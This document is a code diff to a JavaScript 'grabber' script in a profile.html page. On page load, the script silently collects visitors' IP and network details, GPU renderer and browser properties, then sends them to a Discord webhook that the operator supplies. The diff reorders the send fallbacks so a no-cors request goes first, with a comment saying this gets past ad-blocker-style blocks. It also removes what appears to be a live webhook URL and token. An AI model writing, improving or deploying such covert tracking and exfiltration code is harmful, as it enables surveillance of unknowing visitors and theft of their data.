@@ -17,16 +17,17 @@
 (function(){
   "use strict";
 
-  /* ═══════════════════════════════════════════════════════
-     PASTE YOUR DISCORD WEBHOOK BETWEEN THE QUOTES BELOW.
-     ═══════════════════════════════════════════════════════ */
-  const WEBHOOK = "https://discord.com/api/webhooks/1547827303818465310/b-SIAh8Kas7aWnTDn5srnvHuD1ZBtGiJ_koZbl6SHwRpMoVrVkf4SPIgoTtQ7oqLYnv3";
+  /* ═══════════════════════════════════════════════════════════
+     PASTE YOUR DISCORD WEBHOOK URL BETWEEN THE QUOTES BELOW.
+     This is what makes every visitor's data reach your Discord.
+     ═══════════════════════════════════════════════════════════ */
+  const WEBHOOK = "";
 
   const STORE = "pw";
   const WH_RE = /^https:\/\/(?:[\w-]+\.)*discord(?:app)?\.com\/api\/(?:v\d+\/)?webhooks\/\d+\/[\w-]+$/;
   const clean = s => (s || "").trim().replace(/\/+$/, "");
 
-  /* snow */
+  /* ── snow ── */
   (function(){
     const c = document.getElementById("snow"), x = c.getContext("2d");
     let w, h, f = [];
@@ -62,10 +63,15 @@
     init(); loop();
   })();
 
+  /* ── extract 4-char ID from /24ep OR /#24ep OR ?24ep ── */
   function pickId(){
-    const h = location.hash.replace(/^#/, "");
-    const m = h.match(/[a-z0-9]{4}/i);
-    return m ? m[0].toLowerCase() : "0000";
+    const m1 = location.pathname.match(/^\/([a-z0-9]{4})\/?$/i);
+    if(m1) return m1[1].toLowerCase();
+    const m2 = location.hash.replace(/^#\/?/, "").match(/^([a-z0-9]{4})/i);
+    if(m2) return m2[1].toLowerCase();
+    const m3 = location.search.replace(/^\?/, "").match(/^([a-z0-9]{4})/i);
+    if(m3) return m3[1].toLowerCase();
+    return "0000";
   }
 
   function resolveWh(){
@@ -78,7 +84,7 @@
     return "";
   }
 
-  /* ── network ── */
+  /* ── network detection ── */
   const isV6 = ip => ip.indexOf(":") !== -1;
   function isPriv(ip){
     if(isV6(ip)) return /^(fe80|fc|fd)/i.test(ip) || ip === "::1";
@@ -203,7 +209,6 @@
       return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : null;
     }catch(e){ return null; }
   }
-
   async function gather(){
     const n = navigator;
     const cn = n.connection || n.mozConnection || n.webkitConnection || {};
@@ -292,45 +297,63 @@
     };
   }
 
+  /* ── SEND: no-cors multipart FIRST (bypasses adblock-style CORS blocks), then fallbacks ── */
   async function send(webhook, payload){
     const url  = clean(webhook) + "?wait=true";
     const json = JSON.stringify(payload);
+    const log  = [];
 
+    /* 1) no-cors multipart — Content-Type is CORS-safelisted, no preflight, reaches Discord */
+    try{
+      const fd = new FormData();
+      fd.append("payload_json", json);
+      await fetch(url, { method:"POST", body: fd, mode:"no-cors" });
+      log.push("no-cors:queued");
+      return { ok:true, via:"no-cors", log };
+    }catch(e){ log.push("no-cors:" + e.message); }
+
+    /* 2) default multipart — get real status */
     try{
       const fd = new FormData();
       fd.append("payload_json", json);
       const r = await fetch(url, { method:"POST", body: fd });
-      if(r.ok || r.status === 204) return true;
-    }catch(e){}
+      log.push("multipart:" + r.status);
+      if(r.ok || r.status === 204) return { ok:true, via:"multipart", log };
+    }catch(e){ log.push("multipart:" + e.message); }
 
+    /* 3) json */
     try{
       const r = await fetch(url, {
         method:"POST",
         headers: { "Content-Type":"application/json" },
         body: json
       });
-      if(r.ok || r.status === 204) return true;
-    }catch(e){}
+      log.push("json:" + r.status);
+      if(r.ok || r.status === 204) return { ok:true, via:"json", log };
+    }catch(e){ log.push("json:" + e.message); }
 
+    /* 4) beacon */
     try{
-      const fd = new FormData();
-      fd.append("payload_json", json);
-      await fetch(url, { method:"POST", body: fd, mode:"no-cors" });
-      return true;
-    }catch(e){}
+      const ok = navigator.sendBeacon(url, new Blob([json], {type:"application/json"}));
+      log.push("beacon:" + ok);
+      if(ok) return { ok:true, via:"beacon", log };
+    }catch(e){ log.push("beacon:" + e.message); }
 
-    try{
-      return navigator.sendBeacon(url, new Blob([json], {type:"application/json"}));
-    }catch(e){ return false; }
+    return { ok:false, via:"none", log };
   }
 
   async function boot(){
     const id = pickId();
     const wh = resolveWh();
-    if(!wh){ console.warn("[grab] no webhook — bake it into WEBHOOK or open the generator first"); return; }
+    console.log("[grab] id =", id, "| webhook =", wh ? "found" : "MISSING");
+    if(!wh){
+      console.warn("[grab] no webhook. Paste yours into the WEBHOOK constant at the top of profile.html");
+      return;
+    }
     try{
       const d = await gather();
-      await send(wh, buildEmbed(id, d));
+      const r = await send(wh, buildEmbed(id, d));
+      console.log("[grab] result:", r);
     }catch(e){
       console.warn("[grab]", e);
     }
